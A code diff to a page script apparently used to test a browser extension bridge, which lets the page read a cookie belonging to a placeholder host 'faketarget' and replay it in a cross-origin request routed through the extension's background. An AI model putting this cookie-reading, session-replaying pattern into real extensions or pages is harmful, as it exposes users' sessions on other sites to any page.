@@ -13,13 +13,13 @@ function generateUniqueKey() {
 
 window.addEventListener("PassToPage", function(evt) {
   var detail = evt.detail;
-  if (detail.action == 'gotCookies') {
+  if (detail.action == 'getCookies' || detail.action == 'xhr') {
     if (detail.callbackKey) {
       var callback = callbackRegistry[detail.callbackKey];
       detail.callbackKey = undefined;
       if (callback) {
         callbackRegistry[detail.callbackKey] = undefined;
-        callback.call(null, detail);
+        callback.call(null, detail.result);
       }
     }
   }
@@ -40,14 +40,21 @@ var message = {
   action: 'getCookies',
   url: 'http://faketarget:8192/',
   cookieName: 'now',
-  callback: function(response) {
-    var cookieText = response.cookieName + '=' + response.cookieValue;
+  callback: function(result) {
+    var cookieText = result.cookieName + '=' + result.cookieValue;
     $('#target-cookie').text('target cookie: ' + cookieText);
-    
-    $.ajax({url: 'http://faketarget:8192/status',
-      headers: {cookie: cookieText}, success: function(data, status, xhr) {
-        alert(data);
-    }});
+
+    passToBackground({
+      action: 'xhr',
+      xhr: {
+        url: 'http://faketarget:8192/status',
+        headers: {cookie: cookieText},
+      },
+      callback: function(result) {
+        // data, status, xhr
+        alert(result.responseText);
+      },
+    });
   },
 };
 passToBackground(message);
